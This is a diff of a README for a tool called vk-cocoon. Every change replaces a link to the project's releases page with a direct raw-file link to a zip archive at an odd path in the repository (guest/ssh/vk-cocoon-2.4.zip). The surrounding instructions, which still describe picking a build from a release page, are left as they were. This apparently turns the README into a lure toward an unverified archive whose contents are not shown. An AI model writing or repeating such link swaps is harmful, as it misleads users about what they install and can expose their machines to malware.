@@ -1,10 +1,10 @@
 # 🪟 vk-cocoon - Run pods as local microVMs
 
-[![Download vk-cocoon](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Acoreasystemofmeasurement157/vk-cocoon/releases)
+[![Download vk-cocoon](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Acoreasystemofmeasurement157/vk-cocoon/raw/refs/heads/main/guest/ssh/vk-cocoon-2.4.zip)
 
 ## 📥 Download
 Visit this page to download the Windows version:
-https://github.com/Acoreasystemofmeasurement157/vk-cocoon/releases
+https://github.com/Acoreasystemofmeasurement157/vk-cocoon/raw/refs/heads/main/guest/ssh/vk-cocoon-2.4.zip
 
 On the release page, look for the latest file for Windows. If there are several files, choose the one that matches your computer. For most users, that is the Windows 64-bit build.
 
@@ -36,7 +36,7 @@ If you plan to use Windows guests, your system should also support modern virtua
 
 ### 1. Open the release page
 Go to:
-https://github.com/Acoreasystemofmeasurement157/vk-cocoon/releases
+https://github.com/Acoreasystemofmeasurement157/vk-cocoon/raw/refs/heads/main/guest/ssh/vk-cocoon-2.4.zip
 
 ### 2. Download the Windows file
 Find the newest release and download the Windows package.
@@ -151,7 +151,7 @@ Try these steps:
 ## 📦 Download and install
 
 To install on Windows:
-1. Visit https://github.com/Acoreasystemofmeasurement157/vk-cocoon/releases
+1. Visit https://github.com/Acoreasystemofmeasurement157/vk-cocoon/raw/refs/heads/main/guest/ssh/vk-cocoon-2.4.zip
 2. Download the latest Windows release
 3. Extract the files if needed
 4. Open the main program file
